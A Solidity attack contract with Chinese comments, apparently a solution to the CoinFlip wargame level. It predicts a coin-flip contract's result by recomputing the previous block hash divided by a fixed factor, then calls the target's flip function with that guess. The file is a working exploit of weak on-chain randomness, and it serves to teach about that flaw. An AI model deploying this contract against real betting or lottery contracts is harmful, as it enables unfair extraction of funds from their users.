// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 攻击合约接口
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlip public target;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    // 用于调试的事件
    event AttackCalculated(uint256 blockValue, uint256 coinFlipResult, bool predictedGuess);
    event AttackResult(bool success);

    constructor(address _targetAddress) {
        target = ICoinFlip(_targetAddress);
    }

    function attack() external {
        // 1. 获取上一个区块的哈希
        uint256 blockValue = uint256(blockhash(block.number - 1));
        require(blockValue != 0, "Wait for the next block");

        // 2. 用与原合约完全相同的公式计算结果
        uint256 coinFlipResult = blockValue / FACTOR;
        bool predictedGuess = (coinFlipResult == 1);
        
        // 记录计算过程以便观察
        emit AttackCalculated(blockValue, coinFlipResult, predictedGuess);

        // 3. 调用目标合约
        bool success = target.flip(predictedGuess);
        require(success, "Attack failed");
        emit AttackResult(success);
    }
}